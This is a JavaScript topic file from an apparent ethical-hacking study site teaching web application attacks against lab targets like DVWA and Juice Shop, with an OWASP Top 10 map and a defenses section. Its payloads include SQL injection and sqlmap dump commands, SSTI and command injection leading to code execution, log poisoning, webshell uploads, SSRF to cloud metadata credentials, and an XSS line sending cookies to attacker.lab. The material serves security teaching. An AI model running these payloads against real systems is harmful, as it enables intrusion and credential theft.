window.PREP_SITE.registerTopic({
  id: 'eh-web',
  module: 'eh',
  title: 'Web Application Hacking',
  estimatedReadTime: '36 min',
  tags: ['ethical-hacking', 'security', 'pentest', 'web', 'owasp', 'sqli', 'xss', 'ssrf', 'burp-suite', 'idor'],
  sections: [

// ─────────────────────────────────────────────────────────────
{ id: 'tldr', title: '🎯 TL;DR', collapsible: false, html: `
<div class="callout danger">
  <div class="callout-title">⚠️ Lab-only — read Foundations, Ethics &amp; Legal first if you haven't</div>
  <p>Every payload, flag, and command in this topic is written to run against <strong>your own deliberately-vulnerable lab targets only</strong> — DVWA, OWASP Juice Shop, Metasploitable, or an in-scope Hack The Box/TryHackMe box — exactly as set up in the module's first topic. Nothing here is aimed at, or should ever be pointed at, a real website you don't own and don't have explicit written authorization to test. Running these techniques against unauthorized systems is a crime regardless of intent (see ⚠️ Defenses &amp; Legal below and the Foundations topic for the full legal picture).</p>
</div>
<p><strong>Web Application Hacking</strong> is topic 5 of the Ethical Hacking module: after Foundations, Recon &amp; OSINT, Scanning &amp; Enumeration, and Vulnerability Assessment have found and fingerprinted a target's web stack, this topic is where you actually attack the application layer — the forms, parameters, cookies, headers, file uploads, and APIs that make up nearly every real pentest and bug-bounty engagement's largest slice of findings.</p>
<ul>
  <li><strong>The map is the OWASP Top 10 (2021).</strong> Ten ranked categories — from A01 Broken Access Control to A10 Server-Side Request Forgery — that organize almost every vulnerability class covered below. Know the list by number; interviewers ask for it constantly.</li>
  <li><strong>The core toolkit is an intercepting proxy.</strong> <strong>Burp Suite</strong> (Proxy, Repeater, Intruder, Decoder, Comparer, and — in the paid edition — Scanner) or its free equivalent <strong>OWASP ZAP</strong> sit between your browser and the target, letting you see, replay, and mutate every request the app makes.</li>
  <li><strong>The big vulnerability families:</strong> injection (SQLi, command injection, SSTI, XXE, LFI/RFI — the server trusts input as code or a path); XSS (the browser trusts injected script as the page's own); CSRF and SSRF (the server trusts the origin or destination of a request); IDOR/BOLA and broken auth/session (JWT `+"`alg:none`"+` or a weak signing secret) (the server trusts a claimed identity); and file upload flaws (the server trusts an uploaded file's declared type).</li>
  <li><strong>Content discovery comes first.</strong> `+"`gobuster`"+`, `+"`ffuf`"+`, `+"`feroxbuster`"+`, and `+"`dirb`"+` brute-force hidden paths and files; `+"`wpscan`"+` and `+"`nikto`"+` fingerprint known CMS/server weaknesses — all before manual testing narrows in on a specific parameter.</li>
  <li><strong>This is the offensive counterpart to a topic you may have already read.</strong> The <code>web</code> module's <strong>Security (XSS/CSRF/CSP)</strong> topic covers the same vulnerability classes from the defending developer's side (escaping, CSP, SameSite cookies, DOMPurify). This topic covers attacking them, on purpose, in a lab, with permission.</li>
</ul>
<p><strong>Mantra:</strong> "Every input is a potential command, every ID is a potential door, and every URL your server fetches on your behalf is a potential weapon — test each one, in scope, with permission."</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'what-why', title: '🧠 What & Why', html: `
<h3>What "web application hacking" covers</h3>
<p>Everything a web app's server has to trust that it can't fully verify: the data in a URL parameter, a POST body, a cookie, a header, an uploaded file's declared type, or a URL the app itself will go fetch on the user's behalf. Web application hacking is the discipline of systematically abusing each of those trust points — through a browser, an intercepting proxy, and command-line tools — to prove what an attacker could actually reach: read someone else's data, run arbitrary code on the server, take over an account, or pivot into the internal network the server can see but the internet can't.</p>
<p>It's consistently the largest attack surface in most real engagements and almost all public bug-bounty programs, because every organization exposes at least one web app to the internet, and a web app is, by definition, built to accept and act on untrusted input.</p>

<h3>The OWASP Top 10 (2021) — the map this whole topic is organized around</h3>
<table>
  <thead><tr><th>#</th><th>Category</th><th>What it means for a tester</th></tr></thead>
  <tbody>
    <tr><td>A01</td><td>Broken Access Control</td><td>The app checks <em>who you are</em> but not <em>what you're allowed to touch</em> — IDOR/BOLA, forced browsing to admin paths, missing per-object authorization checks.</td></tr>
    <tr><td>A02</td><td>Cryptographic Failures</td><td>Sensitive data transmitted or stored without (or with weak) encryption — plaintext HTTP, weak hashing, predictable tokens.</td></tr>
    <tr><td>A03</td><td>Injection</td><td>Untrusted input is interpreted as code or a query — SQL injection, command injection, SSTI, XSS, LFI/path traversal all live here.</td></tr>
    <tr><td>A04</td><td>Insecure Design</td><td>The flaw is in the design itself, not a coding bug — e.g. no rate limiting on a password-reset flow, business logic that assumes good faith.</td></tr>
    <tr><td>A05</td><td>Security Misconfiguration</td><td>Default credentials, verbose error pages/stack traces, unnecessary features enabled, missing security headers.</td></tr>
    <tr><td>A06</td><td>Vulnerable and Outdated Components</td><td>A known-CVE library, framework, CMS plugin, or server version — exactly what `+"`wpscan`"+` and version-fingerprinting target.</td></tr>
    <tr><td>A07</td><td>Identification and Authentication Failures</td><td>Weak session handling, credential stuffing exposure, JWT implementation flaws (`+"`alg:none`"+`, weak HMAC secret).</td></tr>
    <tr><td>A08</td><td>Software and Data Integrity Failures</td><td>Trusting data or code without verifying its integrity — insecure deserialization, unsigned auto-updates, CI/CD pipeline tampering.</td></tr>
    <tr><td>A09</td><td>Security Logging and Monitoring Failures</td><td>Attacks that would otherwise be caught go undetected because nothing is logged or alerted on.</td></tr>
    <tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td><td>The server fetches a URL on the attacker's behalf — reaching internal services, cloud metadata endpoints, or `+"`localhost`"+`-only admin panels.</td></tr>
  </tbody>
</table>
<p>Two mapping notes worth knowing precisely: <strong>CSRF is not its own 2021 category</strong> — it was a standalone item through the 2013/2017 editions but was folded out in 2021 because most modern frameworks now ship CSRF defenses by default; it's still absolutely worth testing for, and is generally discussed alongside A01 Broken Access Control (a successful CSRF forges an authorized-looking request). And <strong>SSRF only became its own category in 2021</strong> (previously it didn't rank top-10 at all) — the community survey that feeds the list ranked it highly enough to promote it to A10, reflecting how common cloud-metadata SSRF chains had become in real breaches.</p>
<div class="callout info">
  <div class="callout-title">A newer edition exists — this topic deliberately still teaches 2021</div>
  <p>OWASP published the <strong>Top 10:2025</strong> edition (finalized January 2026), which re-ranks several categories, folds SSRF back into Broken Access Control, and adds two new categories (Software Supply Chain Failures; Mishandling of Exceptional Conditions). This topic — and this site's <code>web-security</code> topic — still teach the <strong>2021</strong> numbering because it remains the version most current training material, tooling, and interview questions reference as the baseline; the underlying vulnerability classes taught below (SQLi, XSS, SSRF, IDOR, and the rest) are unchanged either way, only the category boxes they're filed under move.</p>
</div>

<h3>Where each vulnerability class in this topic lands on the list</h3>
<table>
  <thead><tr><th>Vulnerability class</th><th>Primary OWASP 2021 category</th></tr></thead>
  <tbody>
    <tr><td>SQL injection, command injection, SSTI</td><td>A03 Injection</td></tr>
    <tr><td>XSS (reflected/stored/DOM)</td><td>A03 Injection (client-side)</td></tr>
    <tr><td>LFI/RFI, path traversal</td><td>A03 Injection (also CWE-22 Path Traversal specifically)</td></tr>
    <tr><td>XXE</td><td>A05 Security Misconfiguration (XML parser misconfig) — sometimes filed under A03</td></tr>
    <tr><td>IDOR / BOLA</td><td>A01 Broken Access Control</td></tr>
    <tr><td>CSRF</td><td>Folded out in 2021; discussed under A01 Broken Access Control</td></tr>
    <tr><td>SSRF</td><td>A10 Server-Side Request Forgery</td></tr>
    <tr><td>JWT `+"`alg:none`"+`/weak secret, broken session handling</td><td>A07 Identification and Authentication Failures</td></tr>
    <tr><td>Insecure file upload</td><td>A05 Security Misconfiguration (often chains into A03/RCE)</td></tr>
    <tr><td>Vulnerable CMS/plugin (what `+"`wpscan`"+` finds)</td><td>A06 Vulnerable and Outdated Components</td></tr>
  </tbody>
</table>

<h3>Why this matters: chained low-severity bugs become critical findings</h3>
<p>The value of manual web app testing over an automated scan is chaining: a content-discovery hit reveals an unauthenticated debug endpoint (A05); that endpoint accepts a URL parameter vulnerable to SSRF (A10) reaching the cloud metadata service; the metadata response hands back IAM credentials; those credentials open the production database. No single step looks critical in isolation — a scanner might rate each one "low" or "medium" — but the chain is a full compromise. This is exactly why a report needs a human tester connecting dots, not just a vulnerability-scanner printout (a distinction also made in the Foundations topic's pentest-vs-vulnerability-assessment discussion).</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mental-model', title: '🗺️ Mental Model', html: `
<h3>Every web vulnerability is a broken trust boundary</h3>
<p>Instead of memorizing a flat list of vulnerability names, it helps to group them by <em>what the server wrongly trusted</em>. Nearly everything in this topic falls into one of three trust failures:</p>
<pre><code class="language-text">1. "I trusted your INPUT as code/a query/a path"     → Injection family
   (SQLi, command injection, SSTI, XXE, LFI/RFI, XSS)

2. "I trusted your CLAIMED IDENTITY / this cookie"    → Access-control & auth family
   (IDOR/BOLA, CSRF, broken session/JWT handling)

3. "I trusted a URL/FILE to fetch or accept without checking WHERE it points" → Request/content trust family
   (SSRF, insecure file upload)</code></pre>
<p>When you hit an unfamiliar-looking bug in a real assessment, ask which of these three trust boundaries it breaks — it tells you immediately which family of tools and payloads to reach for.</p>

<h3>The attack-surface map: where untrusted input enters</h3>
<table>
  <thead><tr><th>Surface</th><th>Examples</th><th>Commonly missed because</th></tr></thead>
  <tbody>
    <tr><td>URL query parameters</td><td><code>?id=1</code>, <code>?redirect=</code>, <code>?url=</code></td><td>The obvious one — always tested, rarely the only one</td></tr>
    <tr><td>POST/PUT body (form or JSON)</td><td>Login forms, profile updates, API request bodies</td><td>Modern SPAs hide these behind JS — Burp's Proxy history reveals them</td></tr>
    <tr><td>HTTP headers</td><td><code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code>, custom API headers</td><td>Rarely rendered in the UI, so easy to forget they're attacker-controlled too</td></tr>
    <tr><td>Cookies</td><td>Session IDs, "remember me" tokens, role/permission flags</td><td>Assumed tamper-proof; often aren't signed or validated server-side</td></tr>
    <tr><td>File uploads</td><td>Avatar, document, CSV import</td><td>Filtering is usually client-side extension checks only</td></tr>
    <tr><td>Server-initiated requests</td><td>Webhooks, "import from URL," PDF/screenshot generators, image proxies</td><td>Developers think of these as server logic, not user input — but the URL usually comes from the user</td></tr>
  </tbody>
</table>

<h3>The testing loop</h3>
<pre><code class="language-text">Map the surface      →   Intercept &amp; probe        →   Confirm impact        →   Chain &amp; report
(content discovery:       (Burp/ZAP: send every         (turn "the response       (combine findings that
 gobuster/ffuf/dirb,       input surface above           changed" into proven      individually look minor
 wpscan/nikto, manual      through each OWASP             data access / code       into a critical finding
 browsing)                 category below)                execution / auth bypass) — see What &amp; Why above)</code></pre>
<p>This loop nests inside the broader engagement lifecycle from the Foundations topic (Recon → Scanning/Enumeration → Exploitation) — this whole topic <em>is</em> the web-specific version of the "Exploitation" phase, preceded by the web-specific version of "Scanning &amp; Enumeration" (content discovery).</p>

<h3>Burp Suite's tools map onto the loop directly</h3>
<table>
  <thead><tr><th>Burp tool</th><th>Role in the loop</th></tr></thead>
  <tbody>
    <tr><td>Proxy</td><td>Sits in the middle of every request — this is how you <em>see</em> the full attack surface, including hidden POST/JSON bodies and headers</td></tr>
    <tr><td>Repeater</td><td>Resend one captured request with manual edits, over and over — the main tool for confirming a single hypothesis (e.g. "does changing this ID show me someone else's data?")</td></tr>
    <tr><td>Intruder</td><td>Automates Repeater across many payloads/positions (Sniper, Battering ram, Pitchfork, Cluster bomb attack types) — fuzzing a parameter with a wordlist of SQLi/XSS/path-traversal strings</td></tr>
    <tr><td>Decoder</td><td>Encode/decode data (Base64, URL, HTML entities, hex) — needed constantly since payloads travel encoded</td></tr>
    <tr><td>Comparer</td><td>Diff two requests/responses word-for-word or byte-for-byte — the tool that turns a subtle blind-SQLi or user-enumeration timing/length difference into something visible</td></tr>
    <tr><td>Scanner</td><td>Automated crawl + active vulnerability scan (Burp Suite Professional only, not Community) — good for coverage, not a substitute for manual chaining</td></tr>
  </tbody>
</table>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mechanics', title: '⚙️ Techniques & Tools', html: `
<h3>Setting up the intercepting proxy</h3>
<p>Every technique below assumes traffic is flowing through Burp Suite (or OWASP ZAP, its free, actively-maintained alternative with its own Proxy, Spider/crawler, and Active Scan). Route the browser (or a CLI client) through the proxy first:</p>
<pre><code class="language-bash"># Route curl through Burp's default local proxy so the request also shows
# up in Burp for interception, Repeater, or Intruder:
curl -x http://127.0.0.1:8080 -k https://dvwa.lab/vulnerabilities/sqli/?id=1

# ZAP's headless "baseline" active scan, useful for CI or a quick first pass:
docker run --rm -t zaproxy/zap-stable zap-baseline.py -t https://juice-shop.lab</code></pre>

<h3>Content discovery — map the surface before testing anything</h3>
<p>Before touching an OWASP category, find what's actually there: hidden directories, backup files, admin panels, and API routes that were never linked from the UI.</p>
<pre><code class="language-bash"># gobuster: directory/file brute-force
gobuster dir -u https://target.lab -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak -t 50

# ffuf: fast, flexible fuzzer — FUZZ keyword works in the URL, headers, or body
ffuf -u https://target.lab/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403

# feroxbuster: recursive by default, good for deep content trees
feroxbuster -u https://target.lab -w /usr/share/wordlists/dirb/common.txt -x php,html --depth 3

# dirb: the older, simpler baseline
dirb https://target.lab /usr/share/wordlists/dirb/common.txt

# wpscan: fingerprint a WordPress install's plugins/themes/users for known CVEs
wpscan --url https://target.lab --enumerate vp,vt,u --api-token &lt;wpvulndb-token&gt;

# nikto: broad web-server misconfiguration/known-vuln scanner
nikto -h https://target.lab -Tuning x -o nikto-report.html</code></pre>

<h3>SQL Injection</h3>
<p>Manual confirmation first, then automate with <strong>sqlmap</strong>. The four detection techniques you'll hear named constantly:</p>
<ul>
  <li><strong>UNION-based</strong> — append a <code>UNION SELECT</code> matching the original query's column count to pull arbitrary data into the visible response.</li>
  <li><strong>Error-based</strong> — malform the query so the database's own error message leaks data (works when verbose DB errors are shown).</li>
  <li><strong>Blind boolean-based</strong> — no data or errors are shown, but a true/false condition changes the page's content or length; infer data one bit at a time.</li>
  <li><strong>Blind time-based</strong> — same as boolean, but the signal is a deliberate response delay (e.g. <code>SLEEP(5)</code>) instead of a content difference — used when the response looks identical either way.</li>
</ul>
<pre><code class="language-bash"># Manual confirmation payload for a login form or ?id= parameter:
# id=1' OR '1'='1
# id=1' ORDER BY 5-- -        (binary-search the column count for UNION)
# id=-1' UNION SELECT 1,2,3,4,5-- -
# id=1' AND SLEEP(5)-- -      (time-based blind confirmation)

# sqlmap: confirm and enumerate databases automatically
sqlmap -u "https://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="PHPSESSID=abc123; security=low" --batch --dbs

# Force a specific technique, then dump a table once a target DB/table is known
sqlmap -u "https://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="PHPSESSID=abc123; security=low" --batch \\
  --technique=U --level=3 --risk=2 -D dvwa -T users --dump</code></pre>

<h3>Command Injection &amp; Server-Side Template Injection (SSTI)</h3>
<p>Command injection occurs when user input reaches a shell command; SSTI occurs when it reaches a template engine that evaluates expressions server-side. Both convert a text field into arbitrary code execution.</p>
<pre><code class="language-bash"># Command injection — chain a second command onto an expected one
# (test in a field like "ping a host" that shells out to /bin/ping):
127.0.0.1; whoami
127.0.0.1 &amp;&amp; id
127.0.0.1 | whoami
127.0.0.1 $(whoami)
127.0.0.1; ping -c 10 127.0.0.1     # blind confirmation via observable delay

# SSTI detection ladder — send each, see which one evaluates the arithmetic
# (the one that returns 49 tells you the template engine, e.g. Jinja2 for {{ }}):
\${7*7}
{{7*7}}
&lt;%= 7*7 %&gt;
\${{7*7}}

# Jinja2 (Flask) SSTI → RCE once the engine is confirmed:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></pre>

<h3>Local/Remote File Inclusion (LFI/RFI) &amp; Path Traversal</h3>
<pre><code class="language-bash"># Classic path traversal against a page= or file= parameter:
https://target.lab/index.php?page=../../../../etc/passwd

# php://filter wrapper — read a PHP file's SOURCE (base64-encoded) instead of
# having it executed, useful when you can include but not directly view code:
https://target.lab/index.php?page=php://filter/convert.base64-encode/resource=config

# LFI → RCE via log poisoning: inject PHP into a log line the app will include
curl -A "&lt;?php system(\\$_GET['cmd']); ?&gt;" https://target.lab/
https://target.lab/index.php?page=../../../../var/log/apache2/access.log&amp;cmd=id

# RFI (requires allow_url_include=On, rare on modern PHP) — include a remote payload:
https://target.lab/index.php?page=http://attacker.lab/shell.txt</code></pre>

<h3>XML External Entity (XXE) Injection</h3>
<p>Any endpoint that parses user-supplied XML with an XML parser that resolves external entities by default is a candidate — file-upload/import endpoints (SVG, DOCX, SOAP APIs) are common targets.</p>
<pre><code class="language-http">POST /api/import HTTP/1.1
Host: target.lab
Content-Type: application/xml

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>

<h3>Cross-Site Scripting (XSS)</h3>
<p>Three variants, distinguished by where the payload is stored and executed:</p>
<ul>
  <li><strong>Reflected</strong> — the payload comes back in the immediate response (e.g. a search results page echoing the query) and only fires when the victim clicks a crafted link.</li>
  <li><strong>Stored</strong> — the payload is saved server-side (a comment, a profile field) and fires for every later visitor who views it — higher impact, no need to trick anyone into clicking a link.</li>
  <li><strong>DOM-based</strong> — the payload never touches the server; a client-side script reads attacker-controlled data (e.g. <code>location.hash</code>) and writes it unsafely into the DOM (e.g. via <code>innerHTML</code>).</li>
</ul>
<pre><code class="language-bash"># Baseline confirmation payload (paste into a search box, comment field, or param):
&lt;script&gt;alert(document.domain)&lt;/script&gt;

# Filter-bypass variants — try these when &lt;script&gt; tags get stripped:
&lt;img src=x onerror=alert(document.domain)&gt;
&lt;svg onload=alert(document.domain)&gt;
"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;

# DOM XSS test — a location.hash sink is client-side only, so try it directly
# in the address bar rather than as a request parameter:
https://target.lab/page#&lt;img src=x onerror=alert(document.domain)&gt;

# Realistic lab PoC: exfiltrate the session cookie to an attacker-controlled
# listener instead of just alert()ing — only works if the cookie lacks HttpOnly:
&lt;script&gt;fetch('https://attacker.lab/steal?c='+document.cookie)&lt;/script&gt;</code></pre>

<h3>Cross-Site Request Forgery (CSRF)</h3>
<p>Confirm a state-changing endpoint (e.g. a funds transfer or password change) accepts a request with no CSRF token, then check whether it also lacks a <code>SameSite</code> cookie restriction — either protection alone is usually enough to stop it. If both are missing, a forged auto-submitting form hosted on any other page the victim visits will cause their browser to replay this exact authenticated request using their existing session cookie:</p>
<pre><code class="language-http">POST /transfer HTTP/1.1
Host: bank.dvwa.lab
Cookie: PHPSESSID=abc123def456
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

amount=1000&amp;to=attacker</code></pre>

<h3>Server-Side Request Forgery (SSRF)</h3>
<p>Any feature where the server fetches a user-supplied URL (webhooks, "import from URL," PDF renderers, image proxies) is a candidate. The classic high-impact target is a cloud provider's instance metadata endpoint, reachable only from inside the server itself:</p>
<pre><code class="language-bash"># Basic confirmation — point the vulnerable url= parameter at a listener you
# control first, to prove the SERVER (not the browser) is making the request:
curl "https://target.lab/api/fetch?url=http://attacker.lab/ssrf-canary"

# Then escalate to an internal/cloud target the server can reach but you can't:
curl "https://target.lab/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://target.lab/api/fetch?url=http://localhost:8080/admin"

# file:// wrapper variant, when the fetcher isn't restricted to http(s)://
curl "https://target.lab/api/fetch?url=file:///etc/passwd"</code></pre>

<h3>IDOR / BOLA (Insecure Direct Object Reference / Broken Object Level Authorization)</h3>
<p>Same underlying flaw, two names from two different OWASP lists: the general web Top 10 calls it <strong>IDOR</strong>, and the OWASP API Security Top 10 (2023 edition) ranks the API version <strong>API1:2023 Broken Object Level Authorization (BOLA)</strong> as its #1 risk. Both mean the same thing: an endpoint takes an object identifier from the client and returns/modifies that object without checking whether the logged-in user is actually allowed to touch it.</p>
<pre><code class="language-http">GET /api/invoices/1042 HTTP/1.1
Host: target.lab
Authorization: Bearer &lt;your-own-valid-token&gt;

# Test: authenticate as your own low-privileged account, capture this request
# in Burp, then change ONLY the object ID in Repeater — 1042 → 1041, 1043 —
# and confirm whether another user's invoice comes back with your own token.</code></pre>

<h3>Broken Authentication &amp; Session — attacking JWTs</h3>
<p>Two classic JWT implementation flaws to test, both from OWASP A07:</p>
<pre><code class="language-bash"># 1. alg:none — some libraries historically skipped signature verification
#    entirely if the header claimed no algorithm was used. jwt_tool automates
#    trying this and several related exploits ("-X k" also tests the RS256→HS256
#    key-confusion attack, where a known public key gets reused as an HMAC secret):
jwt_tool &lt;captured-jwt&gt; -X a

# 2. Weak/guessable HS256 signing secret — crack it offline with a wordlist,
#    then use the recovered secret to forge a token with any claims you want:
jwt_tool &lt;captured-jwt&gt; -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt</code></pre>

<h3>Insecure File Upload</h3>
<p>Most upload filters only check the file extension or a client-controlled <code>Content-Type</code>, neither of which the attacker is required to be honest about:</p>
<pre><code class="language-bash"># Bypass an extension blocklist/allowlist:
shell.php.jpg           # double extension — some servers execute the first
shell.phtml             # alternate PHP-executable extension often missed
shell.php%00.jpg        # legacy null-byte trick (patched on modern PHP, still tested)

# Upload a minimal PHP webshell once an executable extension gets through,
# then trigger it directly:
curl -F "file=@shell.php" https://target.lab/upload.php
curl "https://target.lab/uploads/shell.php?cmd=id"

# Spoof Content-Type / magic bytes to pass a "must be an image" check:
curl -F "file=@shell.php;type=image/jpeg" https://target.lab/upload.php</code></pre>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'examples', title: '🧪 Worked Examples', html: `
<h3>Example 1 — Content discovery narrows an entire app down to one form</h3>
<pre><code class="language-bash"># 1. Brute-force hidden paths first — don't start manually clicking around:
gobuster dir -u https://juice-shop.lab -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
# → turns up /ftp/ (an exposed backup directory) and /rest/ (an unlinked API root)

# 2. Fuzz the newly-found API root for further hidden endpoints:
ffuf -u https://juice-shop.lab/rest/FUZZ -w /opt/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403
# → reveals /rest/user/login and /rest/products/search?q=

# 3. Run a broad known-vuln/misconfig sweep alongside the targeted fuzzing:
nikto -h https://juice-shop.lab -o nikto-report.html
# → flags a verbose server banner and a missing security header — both worth
#   noting for the report, neither critical on their own</code></pre>
<p>Nothing here is an exploit yet — it's the recon step that turns "a website" into a concrete list of parameters worth attacking manually: <code>/rest/products/search?q=</code> is exactly the kind of endpoint tested for SQL injection next.</p>

<h3>Example 2 — SQL injection, from manual confirmation to full automation</h3>
<pre><code class="language-bash"># 1. Manually confirm the search endpoint found above is injectable:
curl -x http://127.0.0.1:8080 "https://juice-shop.lab/rest/products/search?q=apple'"
# → a 500 error with a raw SQL error message in the body confirms error-based SQLi

# 2. Hand the confirmed parameter to sqlmap instead of building the UNION by hand:
sqlmap -u "https://juice-shop.lab/rest/products/search?q=apple" --batch --dbs
# → --dbs enumerates every database the app's DB user can see

# 3. Target the interesting database and dump the credentials table:
sqlmap -u "https://juice-shop.lab/rest/products/search?q=apple" --batch \\
  -D juiceshop -T Users --dump
# → recovers usernames and password hashes; sqlmap also flags the hash type
#   automatically so it can be handed straight to a cracking tool next</code></pre>
<p>Note the sequence: one hand-crafted payload confirms the class of bug exists at all (worth doing manually so you actually understand <em>why</em> it works), and only then does automation take over the tedious enumeration.</p>

<h3>Example 3 — Reflected XSS confirmed in Burp Repeater, then chained toward impact</h3>
<pre><code class="language-bash"># 1. A search box reflects the query unescaped into the page. Confirm in the browser:
https://dvwa.lab/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.domain)&lt;/script&gt;

# 2. Capture the same request in Burp Proxy, send it to Repeater, and try filter-bypass
# variants there if the raw &lt;script&gt; tag gets stripped or encoded:
&lt;img src=x onerror=alert(document.domain)&gt;

# 3. Once confirmed, the realistic PoC for a report is exfiltration, not just alert():
&lt;script&gt;fetch('https://attacker.lab/steal?c='+document.cookie)&lt;/script&gt;
# → in DVWA's default config this SUCCEEDS (cookie has no HttpOnly flag);
#   note in the report that a properly-flagged HttpOnly cookie (see Defenses
#   below) would have prevented this exact PoC even with the XSS still present</code></pre>
<p>The report-worthy distinction: the XSS bug and the cookie-theft impact are two separate facts. A HttpOnly-flagged cookie doesn't fix the XSS — it just neutralizes this <em>one</em> exploitation path, which is exactly why defense-in-depth (fix the injection <em>and</em> flag the cookie) matters more than fixing either alone.</p>

<h3>Example 4 — SSRF reaching cloud instance metadata via Burp Repeater</h3>
<pre><code class="language-bash"># 1. The app has a "fetch preview image from URL" feature. Confirm the SERVER
# is making the request (not client-side JS) by pointing it at a listener:
curl "https://target.lab/api/preview?url=http://attacker.lab/canary"
# → your listener logs an inbound hit from the TARGET's server IP, not the
#   tester's own browser — confirms genuine server-side SSRF

# 2. Send the same request to Burp Repeater and swap the url= value to the
# cloud metadata endpoint reachable only from inside the target's network:
# GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → response body includes a role name

# 3. Request that specific role's temporary credentials the same way:
# GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
# → response includes AccessKeyId/SecretAccessKey/Token — usable to call the
#   cloud provider's API with whatever permissions that role carries</code></pre>
<p>This is the single most common way an SSRF finding gets rated Critical instead of Medium in a real report: on its own, "the server can be made to fetch an arbitrary URL" sounds low-impact; chained into cloud IAM credential theft, it's a path to the entire cloud account.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'edge-cases', title: '⚠️ Defenses & Legal', html: `
<div class="callout danger">
  <div class="callout-title">⚠️ Authorization reminder</div>
  <p>Everything above is written for, and must stay confined to, systems you own or are explicitly, in-writing authorized to test — your own lab, DVWA/Juice Shop/Metasploitable, or an in-scope Hack The Box/TryHackMe/bug-bounty target. The exact same commands against a system without that authorization are a crime under the CFAA and its international equivalents, regardless of intent, skill, or whether any actual damage occurred — see the Foundations, Ethics &amp; Legal topic for the full legal treatment. If you find something out of scope mid-test, stop touching it and report it — don't "just take a quick look."</p>
</div>

<h3>Input validation &amp; parameterized queries — stops SQLi (and most injection)</h3>
<p>The fix for SQL injection is never "escape the quotes better" — it's <strong>parameterized queries / prepared statements</strong>, where user input is passed as a bound parameter and never concatenated into the query string, so the database can never confuse data for SQL syntax. Pair this with strict server-side <strong>input validation</strong> (allowlist expected format/type/length, reject everything else) as defense-in-depth, since validation alone is bypassable but parameterization structurally can't be.</p>

<h3>Output encoding &amp; CSP — stops XSS</h3>
<p><strong>Output encoding</strong> (HTML-entity encode anything reflected into HTML, JS-encode anything injected into a script context, URL-encode anything in a URL) is the primary XSS fix — encode at the point of output, based on the context you're writing into, not just once at input time. A <strong>Content-Security-Policy</strong> header is the second layer: a strict CSP (no <code>unsafe-inline</code>, nonce- or hash-based script allowlisting) means that even if an injection slips through, the browser refuses to execute it. This site's <code>web-security</code> topic covers both of these — plus DOMPurify, Trusted Types, and the exact CSP directive syntax — from the defending-developer side in full depth.</p>

<h3>CSRF tokens (and SameSite cookies) — stops CSRF</h3>
<p>A unique, unpredictable <strong>CSRF token</strong> embedded in every state-changing form/request and validated server-side on submission means a forged cross-origin request simply can't include the right token. Setting session cookies with <code>SameSite=Lax</code> or <code>SameSite=Strict</code> is a second, largely independent layer — it stops the browser from attaching the cookie to a cross-site request at all, regardless of whether a token is also present.</p>

<h3>SSRF allow-lists — stops SSRF</h3>
<p>The only reliable SSRF fix is a strict server-side <strong>allow-list</strong> of exact destination hosts/IPs the server is permitted to fetch (never a denylist of "bad" hosts — those are always bypassable via redirects, DNS rebinding, or alternate IP encodings). Where a full allow-list isn't feasible, disable following redirects, block requests to link-local/metadata ranges (<code>169.254.169.254</code>, <code>fd00:ec2::254</code>) and private IP ranges outright, and require the newer cloud-provider metadata protocols that need an explicit token exchange (e.g. AWS IMDSv2) rather than the plain-GET-vulnerable legacy version.</p>

<h3>WAF — a mitigating control, not a fix</h3>
<p>A <strong>Web Application Firewall</strong> can catch and block known payload patterns before they reach the app, and buys time against opportunistic/automated attacks — but it's pattern-matching sitting in front of the real bug, not a replacement for fixing the underlying flaw. Nearly every WAF has documented bypass techniques (encoding tricks, case variation, comment insertion), which is exactly why a pentest report should never accept "we have a WAF" as a finished remediation for an injection or XSS finding.</p>

<h3>Authorization checks — stops IDOR/BOLA</h3>
<p>Every endpoint that accepts an object identifier from the client must perform a server-side check that the authenticated user is actually permitted to access <em>that specific object</em> — not just that they're logged in at all. Preferring random, unguessable identifiers (UUIDs) over sequential integers raises the bar for casual probing but is not a substitute for the authorization check itself; a UUID is still an IDOR if anyone with a valid one (e.g. leaked in a URL or referrer header) can use it with no ownership check behind it.</p>

<h3>Rounding out the defenses named in this topic</h3>
<ul>
  <li><strong>JWT:</strong> reject <code>alg:none</code> explicitly in the verification library's configuration (don't trust the token's own header to say which algorithm to use), use a long random HMAC secret or move to asymmetric signing (RS256/ES256), and keep token lifetimes short.</li>
  <li><strong>XXE:</strong> disable external entity resolution and DTD processing in the XML parser's configuration — nearly every modern XML library supports this as a single config flag, and it should be the default posture, not opt-in.</li>
  <li><strong>File upload:</strong> validate the file's actual content (magic bytes/MIME sniffing, not the client-supplied extension or <code>Content-Type</code>), store uploads outside the web root or in non-executable storage, and re-encode/re-generate images rather than trusting the upload as-is.</li>
  <li><strong>LFI/RFI:</strong> never build an include/file path by concatenating user input; validate against a strict allow-list of expected filenames, and disable <code>allow_url_include</code> (PHP) entirely.</li>
</ul>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'cheat-sheet', title: '📋 Cheat Sheet', html: `
<table>
  <thead><tr><th>Category</th><th>Item</th><th>What it means</th></tr></thead>
  <tbody>
